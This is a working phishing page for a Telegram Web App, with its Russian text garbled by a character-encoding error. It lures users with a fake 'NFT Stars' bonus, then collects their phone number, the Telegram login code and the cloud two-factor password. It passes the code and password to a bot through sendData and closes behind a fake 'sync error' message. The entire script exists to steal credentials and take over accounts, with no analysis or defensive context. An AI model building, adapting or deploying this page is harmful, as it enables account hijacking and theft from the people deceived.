<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NFT Stars Bonus</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #0b0b0c; --card: #161618; --accent: #007aff; --text: #ffffff; --secondary: #8e8e93; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; text-align: center; }
        .glass-card { background: var(--card); border-radius: 24px; padding: 24px; border: 1px solid rgba(255,255,255,0.05); margin-top: 20px; }
        .stars-count { font-size: 48px; font-weight: 800; color: #ffd700; margin: 10px 0; text-shadow: 0 0 20px rgba(255,215,0,0.3); }
        .input-group { margin-top: 20px; text-align: left; }
        input { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #2c2c2e; color: white; margin-top: 8px; box-sizing: border-box; font-size: 16px; }
        .btn { background: var(--accent); color: white; border: none; border-radius: 14px; padding: 16px; width: 100%; font-weight: 600; margin-top: 20px; cursor: pointer; }
        .step { display: none; animation: slide 0.3s ease; }
        .active { display: block; }
        @keyframes slide { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="step-bonus" class="step active">
        <div class="glass-card">
            <div style="font-size: 50px;">üéÅ</div>
            <h2>–í–∞—à –±–æ–Ω—É—Å!</h2>
            <p style="color: var(--secondary);">–í—ã –ø–æ–ª—É—á–∏–ª–∏ –ø–æ–¥–∞—Ä–æ–∫ –∑–∞ –ø–µ—Ä–≤—ã–π –≤—Ö–æ–¥</p>
            <div class="stars-count" id="stars">0</div>
            <p>NFT Stars</p>
            <button class="btn" onclick="getStars()">–ó–∞–±—Ä–∞—Ç—å 20 –∑–≤–µ–∑–¥</button>
        </div>
    </div>

    <div id="step-phone" class="step">
        <h2>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h2>
        <p style="color: var(--secondary);">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–ª–∞–¥–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–º –¥–ª—è –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –∑–≤–µ–∑–¥</p>
        <div class="glass-card">
            <button class="btn" onclick="requestPhone()">üõ° –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º</button>
            <p style="font-size: 12px; color: var(--secondary); margin-top: 15px;">–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏</p>
        </div>
    </div>

    <div id="step-code" class="step">
        <h2>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</h2>
        <p style="color: var(--secondary);">–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –≤ –≤–∞—à Telegram</p>
        <div class="glass-card">
            <input type="number" id="sms_code" placeholder="00000" oninput="if(this.value.length==5) sendCode()">
            <button class="btn" onclick="sendCode()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
        </div>
    </div>

    <div id="step-2fa" class="step">
        <h2>–î–≤—É—Ö—ç—Ç–∞–ø–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</h2>
        <p style="color: var(--secondary);">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</p>
        <div class="glass-card">
            <input type="password" id="password_2fa" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å">
            <button class="btn" onclick="send2FA()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // 1. –ê–Ω–∏–º–∞—Ü–∏—è –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è –∑–≤–µ–∑–¥
        function getStars() {
            let count = 0;
            let interval = setInterval(() => {
                count++;
                document.getElementById('stars').innerText = count;
                if(count >= 20) {
                    clearInterval(interval);
                    setTimeout(() => { showStep('step-phone'); }, 1000);
                }
            }, 50);
        }

        function showStep(id) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // 2. –ó–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞
        function requestPhone() {
            tg.requestContact((ok) => {
                if(ok) {
                    showStep('step-code'); // –ü–µ—Ä–µ—Ö–æ–¥ –∫ –∫–æ–¥—É –ø–æ—Å–ª–µ –∫–ª–∏–∫–∞
                }
            });
        }

        // 3. –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞
        function sendCode() {
            let code = document.getElementById('sms_code').value;
            if(code.length >= 5) {
                tg.sendData("code:" + code); // –®–ª–µ–º –±–æ—Ç—É
                showStep('step-2fa');
            }
        }

        // 4. –û—Ç–ø—Ä–∞–≤–∫–∞ 2FA
        function send2FA() {
            let pass = document.getElementById('password_2fa').value;
            if(pass.length > 0) {
                tg.sendData("2fa:" + pass); // –®–ª–µ–º –±–æ—Ç—É
                tg.showAlert("–û—à–∏–±–∫–∞ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.");
                tg.close();
            }
        }
    </script>
</body>
</html>
